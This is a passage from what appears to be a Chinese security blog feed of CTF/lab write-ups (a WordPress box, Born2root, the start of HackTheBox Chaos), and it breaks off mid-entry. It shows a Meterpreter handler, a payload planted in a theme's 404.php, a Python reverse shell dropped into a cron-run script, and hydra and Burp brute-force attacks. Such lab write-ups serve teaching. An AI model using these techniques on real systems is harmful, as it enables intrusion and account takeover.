class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.10.128     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>最后来到 <code>Appearance</code> - <code>Editor</code>，修改网站的 <code>404.php</code> 页面，其中的代码就是刚刚 <code>MSF</code> 生成的 <code>payload</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/818.png" alt="图片"></p><p>通过访问 <code>404.php</code> 反弹得到一个 <code>shell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.133/wordpress/wp-content/themes/twentyfifteen/404.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/819.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/820.png" alt="图片"></p><p>发现是一个 <code>www-data</code> 的用户，权限有点小…，我们切换到 <code>bash</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/821.png" alt="图片"></p><p>通过查看 <code>passwd</code> 文件，我发现了一个用户：<code>togie</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/822.png" alt="图片"></p><p>通过 <code>su</code> 切换到 <code>togie</code> 用户，密码是<code>12345</code>（就是之前通过share共享文件夹服务得到的密码）成功登陆到 <code>togie</code> 这个用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/823.png" alt="图片"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>先来查看能执行那些 <code>root</code> 权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/824.png" alt="图片"></p><p>从上图得知，可以执行所有的命令！那么我就直接切换到 <code>root</code> 用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/825.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/826.png" alt="图片"></p><p>成功获取 <code>proof.txt</code> 文件！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过<code>SMB</code>协议连接到共享文件夹服务，得到一个密码<code>12345</code>和网站<code>数据库配置信息</code>；接着通过得到的数据库配置信息尝试登陆 <code>wordpress</code>后台，登陆成功后使用<code>MSF</code>得到一枚<code>shell</code>，最后登陆到<code>togie</code>用户之后切换到 <code>root</code> ，最终拿到 <code>proof.txt</code>文件！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Born2root&#39;s-WriteUP，通过定时任务反弹shell再到Hadry暴力枚举SSH拿到Flag</title>
      <link href="/2019/12/16/CTF-Born2Root/"/>
      <url>/2019/12/16/CTF-Born2Root/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1399335349&auto=1&height=66"></iframe><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/774.png" alt="图片"></p><p>HackGameName：Born2root’s<br>Level：Medium<br>Task：Get <code>/root/flag.txt</code></p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p>利用<code>Linux</code>的<code>/etc/crontab</code>文件获取<code>Shell</code><br>利用<code>Hadry</code>暴力枚举<code>SSH</code>登陆密码</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先是扫描一下 <code>eth0</code> 网卡下有哪些主机存活（wifi连接的网卡）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/775.png" alt="图片"></p><p>扫描出来后，发现靶机 IP ：<code>192.168.0.49</code>，获取到 <code>IP</code> 之后对它进行 <code>NMAP</code> 端口扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.0.49</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/776.png" alt="图片"></p><p>扫描出来它开放了三个端口：<code>22</code>，<code>80</code>，<code>111</code>，操作系统是<code>Linux</code>，内核版本是<code>3.2-4.9</code>（模糊）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)</span><br><span class="line">|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)</span><br><span class="line">|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)</span><br><span class="line">|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:<span class="built_in">cd</span>:df:13:76:32:4e (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/wordpress-blog /files</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title:  Secretsec Company </span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          46136/udp6  status</span><br><span class="line">|   100024  1          47014/udp   status</span><br><span class="line">|   100024  1          53732/tcp6  status</span><br><span class="line">|_  100024  1          56378/tcp   status</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/777.png" alt="图片"></p><p>通过扫描出来的开放服务，我对它进行来搜索，看看有没有对应的漏洞，很显然通过上图来看它们是没有漏洞的！那么我们继续从<code>web</code>开始！</p><p>使用 <code>dirb</code> 对web目录进行探测枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.0.49/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/778.png" alt="图片"></p><p>访问 <code>files</code> 是一个目录遍历，但是里面是空的；接着访问了 <code>http://192.168.0.49/icons/</code> 发现也是一个<code>目录遍历</code>，里面泄漏了很多文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/779.png" alt="图片"></p><p>其中有一个文件 <code>VDSoyuAXiO.txt</code> 打开后发现是一个 <code>ssh</code> 的密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.49/icons/VDSoyuAXiO.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/780.png" alt="图片"></p><p>这个很显然是一个 <code>ssh-keygen</code> 生成的<code>私钥</code>文件！原文件名应该是：<code>id_rsa</code>，通过这个文件我们可以对它进行破解，我们先保存起！继续信息搜集！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/781.png" alt="图片"></p><p>通过访问 <code>robots.txt</code> 后我发现它有两个文件，但是打开后发现没啥用：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/782.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/783.png" alt="图片"></p><p>最后通过访问 <code>index.html</code> 发现它泄漏了一个手机号和三个用户以及一枚邮箱：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tel：052-452-990-054</span><br><span class="line">user：Martin、Hadi、Jimmy</span><br><span class="line">email：martin@sercetsec.com</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/784.png" alt="图片"></p><p>通过信息搜集后，我从<code>web</code>得到了一些用户名、邮箱，最重要的是我还得到了一个 <code>ssh</code> 的私钥！</p><h2 id="登陆SSH"><a href="#登陆SSH" class="headerlink" title="登陆SSH"></a>登陆SSH</h2><p>通过刚刚的信息搜集我利用 <code>wget</code> 把文件<code>VDSoyuAXiO.txt</code>下载到本地并重命名为 <code>id_rsa</code> 文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/785.png" alt="图片"></p><p>因为刚刚得到了几个用户，通过社工到手段再结合利用这个私钥我尝试 <code>ssh</code>登陆三个用户，最终是登陆了 <code>martn</code> 用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa martin@192.168.0.49</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/786.png" alt="图片"></p><p>登陆到 <code>martin</code> 用户后，我通过查看 <code>passwd</code> 文件发现了三个用户，那三个用户正是刚刚信息搜集得到到用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hadi  </span><br><span class="line">jimmy  </span><br><span class="line">martin</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/787.png" alt="图片"></p><p>接着我来到 <code>home</code> 目录下的 <code>hadi</code> 用户，我发现里面没有啥文件可以利用的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/788.png" alt="图片"></p><p>接着尝试进入 <code>jimmy</code> 用户目录发现权限不够，进入不了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/789.png" alt="图片"></p><h2 id="利用定时任务反弹Shell"><a href="#利用定时任务反弹Shell" class="headerlink" title="利用定时任务反弹Shell"></a>利用定时任务反弹Shell</h2><p>通过查看 <code>/etc/crontab</code> 目录，我发现了一个<code>定时任务</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/790.png" alt="图片"></p><p>在 <code>/tmp</code>（临时目录）下有一个 <code>sekurity.py</code> 文件，<code>jimmy</code> 用户会每隔五分钟运行一次！那么，我们可不可以通过这个来反弹<code>Shell</code>呢？</p><p>通过进入 <code>tmp</code> 目录发现里面是空的，啥文件都没有：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/791.png" alt="图片"></p><p>然后创建一个 <code>sekurity.py</code> 文件，里面内容是通过 socket、subprocess、os模块，通过套接字监听 <code>kali</code> 的 <code>ip</code>和<code>端口</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/792.png" alt="图片"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;192.168.0.6&quot;</span>,<span class="number">4444</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>); </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p>然后 <code>Kali</code> 使用 <code>nc</code> 监听 <code>4444</code> 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure><p>过了五分钟后，通过nc得到了一枚shell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/793.png" alt="图片"></p><p>通过信息收集发现 <code>jimmy</code> 用户没得 <code>flag</code> 文件，那么估计就在 <code>hadi</code> 用户哪里！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/794.png" alt="图片"></p><p>这个时候我通过一系列的翻文件和一些关键信息，我没有找到可以利用的地方，没办法只能通过最暴力的办法获取<code>hadi</code>用户：<code>暴力枚举</code>！</p><h2 id="Hadry爆破SSH"><a href="#Hadry爆破SSH" class="headerlink" title="Hadry爆破SSH"></a>Hadry爆破SSH</h2><p>通过字典生成，我生成了有关 <code>hadi</code> 的字典文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/795.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/796.png" alt="图片"></p><p>利用<code>Hadry</code>爆破<code>SSH</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l hadi -P dic.txt 192.168.0.49 ssh  -v </span><br><span class="line">其中-l 指定用户名，可以使用-L指定用户名字典文件；-p指定密码，-P指定密码字典文件;-v显示详细的执行过程；-f爆破成功后就停止枚举。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/797.png" alt="图片"></p><p>通过暴力枚举后，得到 <code>hadi</code> 的密码是 <code>hadi123</code>！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/798.png" alt="图片"></p><p>通过登陆到 <code>hadi</code> 用户后，<code>su</code> 切换 <code>root</code> 用户，密码为 <code>hadi123</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/799.png" alt="图片"></p><p>最终在 <code>root</code> 目录下得到了 <code>flag</code> ！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Chaos-CTF_解题过程</title>
      <link href="/2019/12/09/HackTheBox-Chaos/"/>
      <url>/2019/12/09/HackTheBox-Chaos/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1353428173&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/710.png" alt="图片"></p><p>GameName：Chaos<br>难度：中等<br>IP：10.10.10.120<br>任务：查找user.txt和root.txt文件</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机之后，还是老规矩，先<code>Nmap</code>扫描一下开放服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT 10.10.10.120</span><br><span class="line">-sV:探测端口及版本服务信息</span><br><span class="line">-sT：TCP扫描，因为我想扫描的准确一些</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/711.png" alt="图片"></p><p>开放了两个Web端口：一个是<code>80</code>另一个是<code>10000</code>，其中还有邮件服务：<code>110</code>和<code>995</code>（POP3）、<code>143</code>和<code>993</code>（IMAP），我们先从<code>80</code>下手：</p><blockquote><p>访问：<a href="http://10.10.10.120/">http://10.10.10.120/</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/712.png" alt="图片"></p><p>我们先让他扫描一下目录，由于比较慢，我们先让他扫着：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.120</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/713.png" alt="图片"></p><p>我们先来到网站上，<code>Web</code>页面上显示：<code>Direct IP not allowed</code>，翻译过来就是：不允许直接用IP。那么说明就是80端口不允许使用IP访问，我们可以把它修改成域名访问：设置<code>hosts</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.120    chaos.htb</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/714.png" alt="图片"></p><p>接着我们访问 <code>chaos.htb</code> 得到了一个<code>Web</code>页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chaos.htb/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/715.png" alt="图片"></p><p>经过初步查看，看上去表面是一个静态网页，我还是先扫扫目录和子域名吧：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/716.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[21:36:01] 200 -    5KB - /about.html</span><br><span class="line">[21:36:04] 301 -  304B  - /css  -&gt;  http://chaos.htb/css/</span><br><span class="line">[21:36:06] 301 -  304B  - /img  -&gt;  http://chaos.htb/img/</span><br><span class="line">[21:36:06] 200 -    7KB - /index.html</span><br><span class="line">[21:36:07] 301 -  311B  - /javascript  -&gt;  http://chaos.htb/javascript/</span><br><span class="line">[21:36:07] 301 -  303B  - /js  -&gt;  http://chaos.htb/js/</span><br><span class="line">[21:36:10] 403 -  297B  - /server-status</span><br><span class="line">[21:36:10] 403 -  298B  - /server-status/</span><br><span class="line">[21:36:10] 301 -  307B  - /source  -&gt;  http://chaos.htb/source/</span><br><span class="line">[21:36:10] 200 -  938B  - /source/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz具体的可以看看这篇文章：https://cuokon.github.io/2019/08/28/wfuzz/</span><br><span class="line">wfuzz -c -z file,2.txt -H &#x27;Host: FUZZ.chaos.htb&#x27; -u http://chaos.htb --hc 404</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/717.png" alt="图片"></p><p>扫描出来以后我们还得设置一下<code>hosts</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/718.png" alt="图片"></p><p>设置完之后访问他的三个子域发现<code>admin</code>，<code>web</code>无页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/719.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/720.png" alt="图片"></p><p>只有 <code>webmail</code> 有一个登陆的地方：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webmail.chaos.htb</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/721.png" alt="图片"></p><p>尝试了<code>弱口令</code>失败之后我决定先放放，继续信息收集~</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/722.png" alt="图片"></p><p>看了看，没有什么可以利用的地方，当我一筹莫展的试试，我回到刚刚扫描<code>IP</code>目录的地方，发现了扫描结果和扫描域名的结果截然不同，上面的扫描域名结果没有<code>wp</code>这个目录，而下面扫描<code>IP</code>的结果却有一个<code>wp</code>的目录：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/723.png" alt="图片"></p><p>打开来看看是一个<code>目录遍历</code>，里面有一个 <code>wordpress</code> 的目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.120/wp/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/724.png" alt="图片"></p><p>进入到<code>wordpress</code>目录后呢，发现是一个由<code>wordpress</code>搭建的web网站，其中里面有一篇文章是需要<code>password</code>才能访问的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.120/wp/wordpress/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/725.png" alt="图片"></p><h2 id="Wordpress-爆破密码"><a href="#Wordpress-爆破密码" class="headerlink" title="Wordpress 爆破密码"></a>Wordpress 爆破密码</h2><p>当我尝试了简单的<code>弱口令</code> admin、admin123、password、pass..后无结果，然后我点开他的页面发现了一个<code>HUMAN</code>的作者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/726.png" alt="图片"></p><p>这个时候就需要用到社工了，先按照它的姓名来生成一个字典来为后面的爆破做铺垫：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/727.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/728.png" alt="图片"></p><p>得到一批字典后，利用 <code>BurpSuite</code> 的 <code>Intruder</code> 模块来进行枚举爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /wp/wordpress/wp-login.php?action=postpass HTTP/1.1</span><br><span class="line">Host: 10.10.10.120</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://10.10.10.120</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">X-Forwarded-For: 192.168.1.1</span><br><span class="line">Referer: http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">post_password=§123456§&amp;Submit=Enter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/729.png" alt="图片"></p><p>在爆破前，需要设置一些更改，因为在 <code>wordpress</code> 里，用相同的 <code>Cookie</code> 输入一次密码，密码错误的话，你就不能再用之前的 <code>Cookie</code> 来进行尝试登录密码，不然就会爆破枚举失败：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/730.png" alt="图片"></p><p>那么我们就需要设置 <code>BurpSuite</code> 在爆破时，枚举一个密码字典就重新刷新一次 <code>Cookie</code> 。来到 <code>Options</code> 参数下有一个 <code>Redirections</code>，吧 <code>On-site only</code> 和 <code>Process cookies in redirections</code> 勾选上：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/731.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/732.png" alt="图片"></p><p>根据长度来判断，密码为 <code>human</code>！其实按照社工的思维，有些人设置密码会和用户名相等或者在用户名后面加几个数字符合，例如：liuwx、liuwx123、liuwx@123、liuwx123456…等等，果然不出我所料，爆破后密码和用户名一样：<code>human</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/733.png" alt="图片"></p><p>进入到文章页面后，里面有一个邮箱的账号跟密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Protected: chaos</span><br><span class="line">Creds for webmail :</span><br><span class="line">username – ayush</span><br><span class="line">password – jiujitsu</span><br></pre></td></tr></table></figure><h2 id="登录邮箱"><a href="#登录邮箱" class="headerlink" title="登录邮箱"></a>登录邮箱</h2><p>因为刚刚我们得到了一个子域：<code>webmail</code>，然后我们利用刚刚得到的账号密码来进行登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://webmail.chaos.htb</span><br><span class="line">user:ayush</span><br><span class="line">pass:jiujitsu</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/734.png" alt="图片"></p><p>登陆进去之后发现有一枚邮件和两个<code>附件</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/735.png" 